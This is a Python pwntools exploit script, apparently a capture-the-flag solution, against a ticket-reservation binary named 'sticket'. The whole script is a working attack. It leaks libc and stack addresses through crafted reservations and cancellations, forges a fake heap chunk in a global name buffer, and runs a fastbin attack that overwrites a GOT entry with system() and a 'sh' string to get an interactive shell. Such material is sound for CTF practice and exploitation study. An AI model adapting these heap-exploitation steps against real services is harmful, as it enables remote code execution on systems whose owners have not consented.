#!/usr/bin/env python
import sys, os
from pwn import *

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
elf = ELF('sticket'); context.word_size = elf.elfclass
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

def reserve(l, cmt, f=1, t=1, car=1, seat=1):
    r.sendlineafter('>> ', '1')
    r.sendlineafter('>> ', str(f))
    r.sendlineafter('>> ', str(t))
    r.sendlineafter('>> ', str(car))
    r.sendlineafter('>> ', str(seat))
    r.sendlineafter('>> ', str(l))
    if l <= 256:
        r.recvuntil('>> ')
        r.sendline(cmt, l-2)

def confirm(idx):
    r.sendlineafter('>> ', '2')
    r.recvuntil('ID : {}'.format(idx))

def cancel(idx, buf=None):
    r.sendlineafter('>> ', '3')
    if not buf:
        r.sendlineafter('>> ', str(idx))
    else:
        r.sendlineafter('>> ', str(idx).ljust(8, '\x00') + buf)

def logout():
    r.sendlineafter('>> ', '0')

r = remote(HOST, PORT)

# fake chunk to free
f1 = flat('a'*8, 0x41, '\x00'*0x30)
f2 = flat(0, 0x21)
r.sendlineafter('name : ', f1 + f2)

# leak libc
reserve(0x18, flat(0, 0, elf.got['__libc_start_main']))
reserve(1000, 'pop')
cancel(1)
reserve(1000, 'pop')
reserve(1000, 'pop')
confirm(3)
libc_base = r.leak('comment : ') - libc.sym['__libc_start_main']
log.info('libc_base: {}'.format(hex(libc_base)))
libc.address += libc_base
cancel(1)
cancel(2)

# leak stack
reserve(0x18, flat(0, 0, libc.sym['environ']))
cancel(1)
reserve(1000, 'pop')
reserve(1000, 'pop')
confirm(2)
stack = r.leak('comment : ')
log.info('stack: {}'.format(hex(stack)))
cancel(1)

# free global buf to fastbin
name = 0x602220
reserve(0x18, flat(0, 0, name + 0x10))
cancel(2)
logout()

# fastbin attack
r.sendlineafter('name : ', flat('a'*8, 0x41, 0x60202a))
reserve(0x30, 'pop')
reserve(0x30, flat('sh;\x00\x00\x00', libc.sym['system']))



r.interactive()
